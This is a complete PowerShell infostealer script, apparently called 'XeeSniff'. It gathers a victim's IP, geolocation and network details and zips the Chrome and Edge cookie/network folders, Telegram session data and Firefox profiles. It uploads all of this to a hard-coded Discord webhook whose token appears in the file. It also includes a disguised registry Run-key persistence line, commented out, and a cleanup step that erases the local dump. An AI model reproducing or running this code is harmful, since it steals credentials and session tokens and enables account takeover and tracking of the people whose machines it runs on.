# === CONFIG ===
$webhook = "https://discord.com/api/webhooks/1374258261922152578/NPsuFh6jP-ZwrZ4hq8fkYmCvGzlEYzZMK3uIZPxYP4-Eg0thnKi-MzxYBQx3whNN4gCl"
$dumpFolder = "$env:TEMP\XeeDump"
$scriptPath = $MyInvocation.MyCommand.Path
Add-Type -AssemblyName System.IO.Compression.FileSystem

# === AUTOSTART ===
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "Window Security Checks"
#Set-ItemProperty -Path $regPath -Name $regName -Value "`"$scriptPath`""

# === PREP ===
if (-not (Test-Path $dumpFolder)) {
    New-Item -ItemType Directory -Path $dumpFolder | Out-Null
}

# === GEO & IP INFO ===
function Get-IPInfo {
    try {
        $ipData = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=66846719"
        $hostname = $env:COMPUTERNAME
        $dnsServers = (Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object -ExpandProperty ServerAddresses) -join ", "
        $adapter = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null } | Select-Object -First 1
        $gateway = $adapter.IPv4DefaultGateway.NextHop
        $localIP = $adapter.IPv4Address.IPAddress
        $ieProxy = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        $ieProxyEnabled = $ieProxy.ProxyEnable
        $ieProxyServer = $ieProxy.ProxyServer
        $winHttpProxy = netsh winhttp show proxy | Out-String

        return @{
            PublicIP      = $ipData.query
            Hostname      = $hostname
            LocalIP       = $localIP
            Gateway       = $gateway
            DNS           = $dnsServers
            Country       = $ipData.country
            Region        = $ipData.regionName
            City          = $ipData.city
            ZIP           = $ipData.zip
            Lat           = $ipData.lat
            Lon           = $ipData.lon
            TimeZone      = $ipData.timezone
            ISP           = $ipData.isp
            Org           = $ipData.org
            AS            = $ipData.'as'
            ProxyDetected = if ($ipData.proxy -eq $true -or $ieProxyEnabled -eq 1 -or $winHttpProxy -match 'Proxy Server') { "Yes" } else { "No" }
            ProxySource   = @{
                APIProxyFlag   = $ipData.proxy
                IEProxyEnabled = $ieProxyEnabled
                IEProxyServer  = $ieProxyServer
                WinHTTPProxy   = $winHttpProxy.Trim()
            }
        }
    } catch {}
}

function Send-DiscordEmbed {
    param (
        [string]$title,
        [string]$desc,
        [string]$filename,
        [object]$filecontent
    )

    $embed = @{
        "username" = "XeeSniff"
        "embeds" = @(@{
            "title" = $title
            "description" = $desc
            "color" = 14423100
            "footer" = @{ "text" = "XeeTST" }
        })
    }

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = @()
    $bodyLines += "--$boundary"
    $bodyLines += "Content-Disposition: form-data; name=`"payload_json`"$LF$LF"
    $bodyLines += ($embed | ConvertTo-Json -Depth 10)
    $bodyLines += "$LF--$boundary"
    $bodyLines += "Content-Disposition: form-data; name=`"file0`"; filename=`"$filename`"$LF"
    $bodyLines += "Content-Type: application/octet-stream$LF$LF"
    $bodyLines += $filecontent
    $bodyLines += "$LF--$boundary--$LF"

    $body = $bodyLines -join $LF

    try {
        Invoke-RestMethod -Uri $webhook -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    } catch {}
}

$ipInfo = Get-IPInfo
$Ipdesc = @"
**Hostname:** $($ipInfo.Hostname)
**Local IP:** $($ipInfo.LocalIP)
**Public IP:** $($ipInfo.PublicIP)
**Default Gateway:** $($ipInfo.Gateway)
**DNS Servers:** $($ipInfo.DNS)

**Country:** $($ipInfo.Country)
**Region:** $($ipInfo.Region)
**City:** $($ipInfo.City)
**ZIP Code:** $($ipInfo.ZIP)
**Lat / Lon:** $($ipInfo.Lat), $($ipInfo.Lon)
**Timezone:** $($ipInfo.TimeZone)
**ISP:** $($ipInfo.ISP)
**Org:** $($ipInfo.Org)
**AS:** $($ipInfo.AS)

**Proxy Detected:** $($ipInfo.ProxyDetected)
  - **API Flag:** $($ipInfo.ProxySource.APIProxyFlag)
  - **IE Proxy Enabled:** $($ipInfo.ProxySource.IEProxyEnabled)
  - **IE Proxy Server:** $($ipInfo.ProxySource.IEProxyServer)
  - **WinHTTP Proxy:** $($ipInfo.ProxySource.WinHTTPProxy)
"@

Send-DiscordEmbed -title "IP Information" -desc $Ipdesc -filename "info.txt" -filecontent $Ipdesc

# === BROWSER COOKIE DUMP ===
$browsers = @{
    "Chrome"   = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network"
    "Edge"     = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network"
    "Telegram" = "$env:APPDATA\Telegram Desktop\tdata"
    "FireFox"  = "$env:APPDATA\Mozilla\Firefox\Profiles"
}

$collectedCookies = @()

foreach ($browser in $browsers.GetEnumerator()) {
    $shortName = $browser.Key
    $cookiePath = $browser.Value

    if (Test-Path $cookiePath) {
        try {
            $zipPath = Join-Path $dumpFolder "$shortName.zip"
            [System.IO.Compression.ZipFile]::CreateFromDirectory($cookiePath, $zipPath)

            $bytes = [IO.File]::ReadAllBytes($zipPath)

            $collectedCookies += [PSCustomObject]@{
                Name      = "$shortName.zip"
                Path      = $cookiePath
                LocalCopy = $zipPath
                Bytes     = $bytes
                Title     = "$shortName Cookie Dump"
            }
        } catch {}
    } 
}

if ($collectedCookies.Count -gt 0) {
    foreach ($item in $collectedCookies) {
        $desc = "`n**$($item.Name):** $($item.Path)"
        Send-DiscordEmbed -title $item.Title -desc $desc -filename $item.Name -filecontent $item.Bytes
    }
}

# === CLEANUP ===
try {
    Remove-Item -Path $dumpFolder -Recurse -Force -ErrorAction SilentlyContinue
} catch {}
